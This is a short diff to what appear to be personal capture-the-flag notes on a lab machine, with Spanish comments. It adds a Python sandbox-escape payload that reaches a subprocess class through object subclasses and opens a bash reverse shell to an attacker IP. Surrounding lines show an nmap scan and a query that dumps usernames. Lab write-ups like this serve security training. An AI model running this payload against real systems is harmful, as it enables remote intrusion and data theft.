@@ -21,6 +21,13 @@ nmap -p22,5000 -sVC -n -Pn --min-rate 5000 10.10.11.62 -oN Targeted -oX Targeted
 
 
 
+este me ha funcado:
+```bash
+print(().__class__.__bases__[0].__subclasses__()[317](['bash -c "bash -i >& /dev/tcp/10.10.16.7/4444 0>&1"'], shell=True))
+```
+![[Pasted image 20250323232019.png]]
+
+
 ```
 To get usernames: print([u.username for u in db.session.query(User).all()])  
   
